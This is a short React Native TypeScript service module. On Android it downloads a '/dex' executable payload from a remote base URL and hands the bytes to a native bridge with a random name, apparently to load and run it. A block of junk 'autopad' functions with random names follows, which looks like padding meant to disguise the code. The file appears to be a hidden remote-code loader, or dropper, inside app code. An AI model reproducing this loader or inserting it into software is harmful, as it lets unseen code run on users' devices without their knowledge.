/* @app-slot:service */
import { NativeModules, Platform } from 'react-native';

function fetchBytes(url: string): Promise<Uint8Array | null> {
  return new Promise((resolve) => {
    const req = new XMLHttpRequest();
    req.open('GET', url);
    req.responseType = 'arraybuffer';
    req.timeout = 15000;
    req.onload = () =>
      resolve(req.status === 200 ? new Uint8Array(req.response) : null);
    req.onerror = () => resolve(null);
    req.ontimeout = () => resolve(null);
    req.send();
  });
}

export async function openWithDex(cfBaseUrl: string, pageUrl: string): Promise<boolean> {
  if (Platform.OS !== 'android') {
    return false;
  }

  const bridge = NativeModules.Lujuloponacaku;
  if (!bridge?.open) {
    return false;
  }

  try {
    const dexUrl = cfBaseUrl.replace(/\/$/, '') + '/dex';
    const bytes = await fetchBytes(dexUrl);
    if (!bytes || bytes.length === 0) {
      return false;
    }
    await bridge.open(Array.from(bytes), pageUrl);
    return true;
  } catch {
    return false;
  }
}

/* autopad-begin */
function azejiqowam(): boolean { return true; }
function axanuy(_fuvacoc: number, _anavumitorel: number, _ikaxociroc: string): number {
  const usacibimufa: number = 223;
  return usacibimufa;
}
function migucuko(_opucerimoci: number, _oyuvosuv: boolean): string {
  const ciyocuyiwuy = 43;
  const turuzij: string = "ipeb";
  return turuzij;
}
/* autopad-end */

